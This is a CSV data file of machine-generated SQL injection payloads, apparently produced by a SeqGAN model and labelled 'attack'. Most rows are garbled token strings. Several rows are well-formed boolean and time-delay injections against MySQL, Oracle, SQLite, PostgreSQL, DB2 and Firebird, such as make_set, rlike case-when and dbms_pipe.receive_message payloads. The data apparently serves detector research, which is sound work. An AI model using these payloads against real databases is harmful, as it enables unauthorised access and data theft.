label,payload,family,payload_type,method,run_id,sample_index
attack,-   qblsersas t  (  65  )  )    83  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,617
attack,1'+  (  select 'qf,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,618
attack,-2925%'  )   or 8384  =  like  (  'dbmsystables as t3  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,619
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,620
attack,"-l2925%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,621
attack,"13455  )  ,5000000   )'  =  '),.z)  )      )    (  )   and ma",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,622
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,623
attack,"1'+  (  select 'wkvk_pumpes.r  (  (  116  )  (  ,5  )  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,624
attack,1  )   where   )  )   -- and 6414  (  (    (  101  )  (  )  --   )   where 3902  =  =    (  selectuserssersersagt  (  (  char  (  8220  =  4297  =    (  ||  (  *  )    )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,625
attack,1%)   wherer  )  65  )  )   and count  =    (  67  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,626
attack,"-6561""   alclas t5 and 3707dppjmabuserssalsabsysysibmsers as and t1,domsyses tys_psers tall_userdt4  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,627
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,628
attack,"1%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,629
attack,1)   where '  )  )    )   abvez  (  101  8220  =  4297  =  9687 and where alluc_uauseresere_maiusessakeseres_sesc  (  101  )  (  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,630
attack,"1"" where 9687  =    (  ""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""  (  (  68  )  (  66  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,631
attack,"1  )   'bhlx' and    (  =    (  8459  ,)  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,632
attack,  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,633
attack,"-29258363%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,634
attack,1  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,635
attack,"  )   and   (  ,5  =    (  ' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,636
attack,"-2925%""   )    )   g  (  )ah  \ah"" like ""   8407  (  ||chr  (  (    (  79  )  ,5  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,637
attack,select t  (  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,638
attack,-6561   bmstab_usedt  (  *  )vdomsersas t  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,639
attack,"1%""  )  )   and   )    (  --'  =  'vd  (  69  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,640
attack,1%'  )   or 8384  =  like  (  'abmsas t3 or alleu(  (  (  (  ah  =  7182  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,641
attack,select cuuunefsers apumas t  )  )    )    )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,642
attack,-3596   )  )    )    )     select 1  )  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,643
attack,1'+  (  select '8189  )    )       or or  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,644
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""fpqakvcve_ms_pte_usesesas t  ,null  =    (  8220  =  8459  )  )",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,645
attack,"1%""lgezerente_es cousesereseceieincousexses as t  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,646
attack,select couusesipereuxpes  (  (  (  5888ah,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,647
attack,"1%' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '""  =  ""kg  (  (  chr  (  109  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,648
attack,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'nt  'abcdefg'est  (  (  66  )  (  ||ch500000000/alhs as t  )  )    )    )   vo,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,649
attack,"1  )  ||char  (  9607  =  )  ""ymss""  =    (  =    (  select coukerumst_psessib",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,650
attack,"-4641""  )  )     3645  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,651
attack,"or 8421  5333  (  112  )  )  --""  =  ""h",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,652
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,653
attack,"1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahrpe.sersal ast  )   from r  )  (  *4906)   from domsers t3,albes as t1,ll_usest  (    (  )  ||h  (  (  *  )  and 8407  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,654
attack,"select or(  ""h  (  *  )  )   and ""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""ypivers_ps_geserece_uses as 9643  =   7552  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,655
attack,-5067'   )    )    or 5903  =    (  'qpu(  (  66  (  66    x  (  chr  (  (  (  69  )  ||ma,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,656
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,657
attack,"1%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  'z%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,658
attack,"1%"" or make_set  (  9354  =  9354,7185  )   and ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,659
attack,"1'+  (  select 'bmasibmast  , or domt  (  =    (  '  (  (  90  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,660
attack,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noms as t1,sypt_lers as t1,rdb$tomest5    (  *  )   al_ns as t  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,661
attack,14297   )    )     )   'ootz' where 5333  =  =    (  7007  (  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,662
attack,1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,663
attack,"1%"" where t  (  select couse.pecouuxusesykesec_uses egerereu+  (  where  (  (  (  *  )  )",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,664
attack,select count  (  67  ) and 9643  =  dbms_steres_aun  (  9607  =  3595  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,665
attack,1  )   as and 3018 or 8407  =  1y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,666
attack,"-2912""alelerece_es  (  char  (  66    =    )  ||char  (  69  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,667
attack,)  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,668
attack,"select couunt  (  =  7046 and    (    (    (  5098  (  cohs  (  67  )  ,5  )  )      ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,669
attack,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rz    )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,670
attack,"1%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%5000000   '  )   and make_set  (  4551  =  6487,6487  )   and   (  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,671
attack,"1'  )  ,null  )  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,672
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,673
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,674
attack,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vunefinmains as where col or aluresces_ese  (  char  (  66  )  ,5  )  )  )    )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,675
attack,1%5098%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,676
attack,-5158dbumseserer  (  1041  =  dbmst,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,677
attack,"-""like  (  79  )  d  (  *  )  ,null  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,678
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsap",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,679
attack,colunesas abcese  (  (  ch  (  116  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,680
attack,1   )    )  --  )   abdegezfhsers_geusere_s_pest  (  (  (/2   )     )    rz  )    )     and   (8673 doun where 7272  )  ||cou  (  67  =e   pumexs_sersersageres(  103  =    (  galcouneast  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,681
attack,"1%'  =  '%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%""  =  """" or make_set  (  9354  =  9354,7185  )   and """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,682
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  ""nsalt  (  =    (  or 8407  )  (  101  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,683
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,684
attack,select couesous  =    (  500000000//2   )    )    )    ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,685
attack,"counont  (  ah  )  83  )  al"" like ""  (    (  7046   )    xper",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,686
attack,"-5158""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,687
attack,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""eaivve",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,688
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jn  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,689
attack,"-2583""  (  9607  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,690
attack,select 5903  =    (  65  )  (  char  (  =  7007  =  =  1 8312  )  --unf,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,691
attack,-9281q%or)  )   and   (  =    (  1041  =  ) and   pup wp   (  *  )    ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,692
attack,"1%)   and 'osqf'  =    (  ,4062  )  )  )  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,693
attack,"-2912lsersas where 2367  =    j(  ,5  )  )     )    )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,694
attack,1'b'  =  'n.umntedouser  =    (  )  ||  (  =   )    )     )    ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,695
attack,"select umap  (  (  (  select  (  (  ),  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,696
